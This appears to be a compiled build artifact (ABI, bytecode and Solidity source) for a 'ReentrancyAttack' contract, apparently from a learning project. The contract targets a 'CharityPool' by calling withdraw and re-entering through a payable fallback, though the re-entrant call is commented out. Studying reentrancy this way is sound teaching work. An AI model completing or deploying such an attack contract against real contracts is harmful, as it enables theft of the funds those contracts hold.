{
  "contractName": "ReentrancyAttack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_charityPool",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "MIN_CHARITY_BALANCE",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "",
          "type": "uint8"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "WEI_SCALE",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "charityPool",
      "outputs": [
        {
          "internalType": "contract CharityPool",
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getContractBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "checkCharityBalanceAndAttack",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "initiateAttack",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405260046000806101000a81548160ff021916908360ff160217905550670de0b6b3a764000060015534801561003757600080fd5b506040516103643803806103648339818101604052602081101561005a57600080fd5b810190808051906020019092919050505080600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506102a8806100bc6000396000f3fe6080604052600436106100555760003560e01c80636f9fb98a1461005f5780636ff1a23d1461008a5780638f856eab146100bb578063ac262f7c14610112578063d28c80fc1461013d578063e0a1f3c814610154575b61005d61016b565b005b34801561006b57600080fd5b50610074610192565b6040518082815260200191505060405180910390f35b34801561009657600080fd5b5061009f6101b1565b604051808260ff1660ff16815260200191505060405180910390f35b3480156100c757600080fd5b506100d06101c3565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561011e57600080fd5b506101276101e9565b6040518082815260200191505060405180910390f35b34801561014957600080fd5b5061015261016b565b005b34801561016057600080fd5b506101696101ef565b005b6001546000809054906101000a900460ff1660ff1602600260009054906101000a90505050565b60003073ffffffffffffffffffffffffffffffffffffffff1631905090565b6000809054906101000a900460ff1681565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015481565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561025957600080fd5b505af115801561026d573d6000803e3d6000fd5b5050505056fea265627a7a72315820bb6cec76ea85a7fdcb3fb6ba5def45bdb63704e4fd9829dce2f9e3f495137e3264736f6c63430005100032",
  "source": "\npragma solidity ^0.5.0;\n\n\nimport './CharityPool.sol';\n\ncontract ReentrancyAttack {\n\n    uint8 public MIN_CHARITY_BALANCE = 4;\n    uint256 public WEI_SCALE = 10**18;\n\n    CharityPool public charityPool;\n\n    constructor(address _charityPool) public {\n        charityPool = CharityPool(_charityPool);\n    }\n\n    function getContractBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n\n\n    function checkCharityBalanceAndAttack() public {\n        if (address(charityPool).balance >= MIN_CHARITY_BALANCE * WEI_SCALE) {\n            //charityPool.withdraw();\n        }\n    }\n\n    // Callback function to continue the attack. Fallback functions\n    // have limited gas, 23000 units.  SO, call another function to\n    // handle the operations.\n    function() external payable {\n        checkCharityBalanceAndAttack();\n    }\n\n\n\n\n    function initiateAttack() public {\n        charityPool.withdraw();\n    }\n\n}\n",
  "sourcePath": "/Users/Nelson/Desktop/DEX-web-app/src/contracts/Hack And Charity Pool/ReentrancyAttack.sol",
  "compiler": {
    "name": "solc",
    "version": "0.5.16+commit.9c3226ce.Emscripten.clang"
  },
  "schemaVersion": "3.4.14",
  "updatedAt": "2023-07-20T22:56:25.995Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}